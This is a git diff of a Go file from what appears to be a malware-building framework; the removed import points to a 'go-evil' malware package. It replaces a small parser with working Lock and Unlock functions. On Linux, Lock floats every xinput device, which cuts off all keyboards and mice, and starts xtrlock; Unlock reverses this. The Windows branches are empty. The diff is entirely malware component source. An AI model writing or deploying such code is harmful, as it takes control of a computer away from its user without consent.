@@ -1,47 +1,60 @@
 package keyboard
 
 import (
+	"os/exec"
 	"regexp"
-
-	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
-	"github.com/s9rA16Bf4/notify_handler/go/notify"
+	"runtime"
 )
 
-const (
-	EXTRACT_SUBDOMAIN      = "(keyboard)\\.(.+)\\.(.+)\\(.*\\);" // Captures subdomain and function
-	EXTRACT_FUNCTION_VALUE = ".+\\(\"(.*)\"\\);"                 // Grabs the value being passed to the function
-	EXTRACT_FUNCTION       = "(keyboard)\\.(.+)\\(.*\\);"        // This is for the cases when we don't have a subdomain
-)
+func Lock() {
+	// Which os are we running on?
+	// We need to lock the keyboard and then the mouse
+	switch runtime.GOOS {
+	case "linux":
+		possible_arguments := []string{"xinput", "xtrlock"}
 
-func Parse(new_line string) {
-	regex := regexp.MustCompile(EXTRACT_SUBDOMAIN)
-	result := regex.FindAllStringSubmatch(new_line, -1)
-	if len(result) > 0 { // There is a subdomain to extract
-		subdomain := result[0][2]
-		//function := result[0][3]
-		switch subdomain {
-		default:
-			subdomain_error(subdomain)
-		}
-	} else { // There might be a function which doesn't require a subdomain to work
-		regex = regexp.MustCompile(EXTRACT_FUNCTION)
-		result = regex.FindAllStringSubmatch(new_line, -1)
-		if len(result) > 0 {
-			function := result[0][2]
-			switch function {
-			case "lock":
-				mal.AddContent("keyboard.Lock()")
-			case "unlock":
-				mal.AddContent("keyboard.Unlock()")
-			default:
-				function_error(function)
+		for _, arg := range possible_arguments {
+			if arg == "xinput" {
+				out, err := exec.Command("xinput", "list").Output()
+				if err == nil { // xinput existed!
+					regex := regexp.MustCompile("([0-9]+)") // This grabs all numbers found, which are devices
+					ids := regex.FindAllStringSubmatch(string(out[:]), -1)
+					for _, id := range ids {
+						exec.Command("xinput", "float", id[1]).Run() // Just loop through and turn everything off
+					}
+				}
+			} else if arg == "xtrlock" {
+				exec.Command("xtrlock").Run()
 			}
 		}
+
+	case "windows":
 	}
 }
-func subdomain_error(subdomain string) {
-	notify.Error("Unknown subdomain '"+subdomain+"'", "keyboard.Parse()")
-}
-func function_error(function string) {
-	notify.Error("Unknown function '"+function+"'", "keyboard.Parse()")
+
+func Unlock() {
+	switch runtime.GOOS {
+	case "linux":
+		possible_arguments := []string{"xinput", "xtrlock"}
+		for _, arg := range possible_arguments {
+
+			if arg == "xinput" {
+				out, err := exec.Command("xinput", "list").Output()
+				if err == nil { // xinput existed!
+					regex := regexp.MustCompile(`\[slave +keyboard \(([0-9]+)\)\]`)    // "\\[slave +keyboard \\(([0-9]+)\\)\\]"
+					master_id := regex.FindAllStringSubmatch(string(out[:]), -1)[0][1] // Grab the first case of 'slave keyboard'
+
+					regex = regexp.MustCompile("([0-9]+)")
+					ids := regex.FindAllStringSubmatch(string(out[:]), -1)
+					for _, id := range ids {
+						exec.Command("xinput", "reattach", id[1], master_id).Run() // Just loop through and turn everything on, don't really care if they get connected to the same device again
+					}
+				}
+			} else if arg == "xtrlock" {
+				exec.Command("killall", "xtrlock").Run() // If this doesn't work well then welp
+			}
+		}
+
+	case "windows":
+	}
 }
